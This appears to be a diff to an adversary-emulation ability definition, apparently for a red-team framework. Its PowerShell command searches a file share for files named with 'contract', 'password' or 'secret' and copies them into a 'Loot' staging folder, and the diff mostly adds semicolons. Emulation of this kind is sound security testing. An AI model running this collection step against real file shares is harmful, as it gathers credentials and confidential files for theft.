@@ -12,13 +12,12 @@
     windows:
       psh:
         command: |
-          $fileServer = "FS01.ifs.network"
-          $stagingDir = "C:\Users\Public\Loot"
-          New-Item -Path $stagingDir -ItemType Directory -ErrorAction SilentlyContinue
-          # Search for specific keywords in the share
+          $fileServer = "FS01.ifs.network";
+          $stagingDir = "C:\Users\Public\Loot";
+          New-Item -Path $stagingDir -ItemType Directory -ErrorAction SilentlyContinue;
           Get-ChildItem -Path \\$fileServer -Recurse -Include "*contract*", "*password*", "*secret*" | ForEach-Object {
-              Copy-Item -Path $_.FullName -Destination $stagingDir
-          }
+              Copy-Item -Path $_.FullName -Destination $stagingDir;
+          };
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
             - source: 'files.collected'
